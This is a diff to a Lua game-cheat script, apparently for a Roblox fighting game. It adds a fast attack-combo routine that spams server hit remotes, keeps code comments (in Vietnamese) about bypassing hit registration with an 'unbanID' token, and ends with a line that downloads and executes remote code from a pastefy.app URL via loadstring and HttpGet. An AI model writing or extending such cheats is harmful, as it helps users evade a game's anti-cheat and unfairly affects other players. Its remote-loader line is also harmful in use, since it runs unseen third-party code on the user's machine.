@@ -136,6 +136,10 @@ end
 local lastAttackTick = 0
 local ATTACK_DELAY = 0.01
 
+-- M1 Combo
+local FruitCombo = 0
+local ComboDebounce = 0
+
 task.spawn(function()
     while true do
         RunService.Heartbeat:Wait() 
@@ -175,16 +179,27 @@ task.spawn(function()
                     end
                     
                     if #fullHitList > 0 then
+                        -- Giữ nguyên Logic Bypass RegisterHit
                         regHit:FireServer(fullHitList[1][2], fullHitList, nil, nil, unbanID)
-                        if i == 1 then
-                            if isFruit then
-                                local leftClick = tool:FindFirstChild("LeftClickRemote", true)
-                                if leftClick then
-                                    local lookVector = (fullHitList[1][2].Position - root.Position).Unit
-                                    if lookVector ~= lookVector then lookVector = Vector3.new(0, 1, 0) end 
-                                    leftClick:FireServer(lookVector, 1, unbanID_base)
-                                end
-                            else
+                        
+                        if isFruit then
+                            local leftClick = tool:FindFirstChild("LeftClickRemote", true)
+                            if leftClick then
+                                local lookVector = (fullHitList[1][2].Position - root.Position).Unit
+                                if lookVector ~= lookVector then lookVector = Vector3.new(0, 1, 0) end 
+                                
+                                -- [ LOGIC COMBO M1 MAX SPEED ]
+                                local currentTime = tick()
+                                FruitCombo = (currentTime - ComboDebounce) <= 0.3 and FruitCombo or 0
+                                FruitCombo = FruitCombo >= 4 and 1 or FruitCombo + 1
+                                ComboDebounce = currentTime
+                                
+                                -- Spam liên tục ko bị giới hạn bởi i == 1 nữa
+                                leftClick:FireServer(lookVector, FruitCombo, unbanID_base)
+                            end
+                        else
+                            -- Melee/Sword attack logic
+                            if i == 1 then
                                 regAttack:FireServer(-math.huge)
                             end
                         end
@@ -196,5 +211,4 @@ task.spawn(function()
     end
 end)
 
-pcall(function() loadstring(game:HttpGet("https://pastefy.app/9oi8Fw4M/raw"))()
-end)
+pcall(function() loadstring(game:HttpGet("https://pastefy.app/9oi8Fw4M/raw"))() end)
